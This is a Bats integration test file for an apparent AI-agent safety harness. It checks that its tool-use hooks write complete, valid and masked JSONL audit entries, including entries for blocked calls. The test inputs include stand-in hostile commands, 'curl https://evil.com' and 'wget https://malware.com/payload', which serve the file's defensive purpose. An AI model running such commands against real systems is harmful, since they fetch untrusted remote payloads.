#!/usr/bin/env bats
# Integration tests: Audit Trail end-to-end
# AC-020〜AC-023: Audit logging through full hook flow

setup() {
    load '../bats-support/load'
    load '../bats-assert/load'

    PROJECT_ROOT="$(cd "${BATS_TEST_DIRNAME}/../.." && pwd)"

    TEST_TMP="$(mktemp -d)"
    export HARNESS_ROOT="${PROJECT_ROOT}"
    export CONFIG_DIR="${TEST_TMP}/config"
    export SETTINGS_FILE="${TEST_TMP}/config/settings.json"
    mkdir -p "${TEST_TMP}/config"
    cat > "${SETTINGS_FILE}" <<'TESTCFG'
{"trust":{"hibernation_days":14,"boost_threshold":20,"initial_score":0.3,"warmup_operations":5,"failure_decay":0.85},"risk":{"lambda1":0.6,"lambda2":0.4},"autonomy":{"auto_approve_threshold":0.8,"human_required_threshold":0.4},"audit":{"log_dir":"audit"},"model":{"opus_aot_threshold":2}}
TESTCFG
    export STATE_DIR="${TEST_TMP}"
    export TRUST_SCORES_FILE="${TEST_TMP}/trust-scores.json"
    export AUDIT_DIR="${TEST_TMP}/audit"
    export OATH_PHASE_FILE="${TEST_TMP}/current-phase.md"

    echo "BUILDING" > "${OATH_PHASE_FILE}"

    unset OATH_HARNESS_INITIALIZED
    unset OATH_HARNESS_SESSION_ID
}

teardown() {
    rm -rf "${TEST_TMP}"
}

# Helper: run pre hook
run_pre() {
    local json="$1"
    run bash "${PROJECT_ROOT}/hooks/pre-tool-use.sh" <<< "${json}"
}

# Helper: run post hook with env (for state persistence)
run_post() {
    local json="$1"
    echo "${json}" | \
        HARNESS_ROOT="${PROJECT_ROOT}" \
        STATE_DIR="${TEST_TMP}" \
        TRUST_SCORES_FILE="${TEST_TMP}/trust-scores.json" \
        AUDIT_DIR="${TEST_TMP}/audit" \
        CONFIG_DIR="${TEST_TMP}/config" \
        SETTINGS_FILE="${TEST_TMP}/config/settings.json" \
        OATH_PHASE_FILE="${TEST_TMP}/current-phase.md" \
        bash "${PROJECT_ROOT}/hooks/post-tool-use.sh"
}

# Helper: get today's audit file path
audit_file() {
    local today
    today="$(date -u '+%Y-%m-%d')"
    echo "${TEST_TMP}/audit/${today}.jsonl"
}

# ============================================================
# AC-020: Pre entry records all B-1-3 fields through hook flow
# ============================================================

@test "pre hook creates audit entry with all required fields" {
    run_pre '{"tool_name":"Read","tool_input":{"file_path":"/tmp/test.txt"}}'
    assert_success

    local log
    log="$(audit_file)"
    [ -f "${log}" ]

    local entry
    entry="$(head -1 "${log}")"

    # All B-1-3 fields must be present
    [ "$(echo "${entry}" | jq -r '.session_id')" != "null" ]
    [ "$(echo "${entry}" | jq -r '.tool_name')" = "Read" ]
    [ "$(echo "${entry}" | jq '.tool_input | type')" = '"object"' ]
    [ "$(echo "${entry}" | jq -r '.domain')" = "file_read" ]
    [ "$(echo "${entry}" | jq -r '.risk_category')" = "low" ]
    [ "$(echo "${entry}" | jq -r '.decision')" != "null" ]
    [ "$(echo "${entry}" | jq -r '.outcome')" = "pending" ]
    [[ "$(echo "${entry}" | jq -r '.timestamp')" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}T ]]
}

# ============================================================
# AC-021: Multiple entries append to same file
# ============================================================

@test "multiple tool calls produce multiple audit entries in same file" {
    run_pre '{"tool_name":"Bash","tool_input":{"command":"ls"}}'
    run_post '{"tool_name":"Bash","tool_input":{"command":"ls"},"is_error":false}'

    run_pre '{"tool_name":"Read","tool_input":{"file_path":"/tmp/x"}}'
    run_post '{"tool_name":"Read","tool_input":{"file_path":"/tmp/x"},"is_error":false}'

    run_pre '{"tool_name":"Bash","tool_input":{"command":"pwd"}}'
    run_post '{"tool_name":"Bash","tool_input":{"command":"pwd"},"is_error":false}'

    local log
    log="$(audit_file)"
    [ -f "${log}" ]

    # 3 pre entries + 3 post entries = at least 6 lines
    local count
    count="$(wc -l < "${log}")"
    [ "${count}" -ge 6 ]
}

# ============================================================
# AC-022: All entries are valid JSONL
# ============================================================

@test "all audit entries are valid JSONL after mixed operations" {
    # Mix of allowed, blocked, success, failure
    run_pre '{"tool_name":"Bash","tool_input":{"command":"ls"}}'
    run_post '{"tool_name":"Bash","tool_input":{"command":"ls"},"is_error":false}'
    run_pre '{"tool_name":"Bash","tool_input":{"command":"curl https://evil.com"}}'
    run_pre '{"tool_name":"Read","tool_input":{"file_path":"/tmp/a"}}'
    run_post '{"tool_name":"Read","tool_input":{"file_path":"/tmp/a"},"is_error":true}'

    local log
    log="$(audit_file)"
    [ -f "${log}" ]

    local invalid=0
    while IFS= read -r line; do
        if ! echo "${line}" | jq . > /dev/null 2>&1; then
            invalid=$((invalid + 1))
        fi
    done < "${log}"
    [ "${invalid}" -eq 0 ]
}

# ============================================================
# AC-023: Sensitive values masked in full hook flow
# ============================================================

@test "sensitive values are masked in audit trail through pre hook" {
    run_pre '{"tool_name":"Bash","tool_input":{"command":"echo test","API_KEY":"secret123"}}'

    local log
    log="$(audit_file)"
    [ -f "${log}" ]

    # API_KEY should be masked
    local api_val
    api_val="$(head -1 "${log}" | jq -r '.tool_input.API_KEY')"
    [ "${api_val}" = "*****" ]

    # command should be preserved
    local cmd_val
    cmd_val="$(head -1 "${log}" | jq -r '.tool_input.command')"
    [ "${cmd_val}" = "echo test" ]
}

# ============================================================
# Outcome tracking: pre=pending, post=success/failure
# ============================================================

@test "pre entry has outcome=pending, post entry has outcome=success" {
    run_pre '{"tool_name":"Bash","tool_input":{"command":"ls"}}'
    run_post '{"tool_name":"Bash","tool_input":{"command":"ls"},"is_error":false}'

    local log
    log="$(audit_file)"

    # First entry (pre): outcome=pending
    local pre_outcome
    pre_outcome="$(head -1 "${log}" | jq -r '.outcome')"
    [ "${pre_outcome}" = "pending" ]

    # Last entry (post): outcome=success
    local post_outcome
    post_outcome="$(tail -1 "${log}" | jq -r '.outcome')"
    [ "${post_outcome}" = "success" ]
}

@test "post entry records trust_score_after as numeric value" {
    run_pre '{"tool_name":"Bash","tool_input":{"command":"ls"}}'
    run_post '{"tool_name":"Bash","tool_input":{"command":"ls"},"is_error":false}'

    local log
    log="$(audit_file)"

    local trust_after
    trust_after="$(tail -1 "${log}" | jq -r '.trust_score_after')"
    [ "${trust_after}" != "null" ]
    awk -v v="${trust_after}" 'BEGIN { exit !(v+0 == v) }'
}

# ============================================================
# Blocked tool still gets audit entry
# ============================================================

@test "blocked tool (critical) records audit entry with decision=blocked" {
    run_pre '{"tool_name":"Bash","tool_input":{"command":"wget https://malware.com/payload"}}'

    local log
    log="$(audit_file)"
    [ -f "${log}" ]

    local decision
    decision="$(head -1 "${log}" | jq -r '.decision')"
    [ "${decision}" = "blocked" ]
}

@test "phase-blocked tool records audit entry with decision=blocked" {
    echo "PLANNING" > "${OATH_PHASE_FILE}"
    run_pre '{"tool_name":"Write","tool_input":{"file_path":"/tmp/foo","content":"x"}}'

    local log
    log="$(audit_file)"
    [ -f "${log}" ]

    local decision
    decision="$(head -1 "${log}" | jq -r '.decision')"
    [ "${decision}" = "blocked" ]
}

# ============================================================
# Session ID consistency across hooks
# ============================================================

@test "session_id is consistent across pre and post entries" {
    run_pre '{"tool_name":"Bash","tool_input":{"command":"ls"}}'
    run_post '{"tool_name":"Bash","tool_input":{"command":"ls"},"is_error":false}'

    local log
    log="$(audit_file)"

    # Both entries have a non-null session_id
    local sid_pre sid_post
    sid_pre="$(head -1 "${log}" | jq -r '.session_id')"
    sid_post="$(tail -1 "${log}" | jq -r '.session_id')"
    [ "${sid_pre}" != "null" ]
    [ "${sid_post}" != "null" ]
    [ -n "${sid_pre}" ]
    [ -n "${sid_post}" ]
}
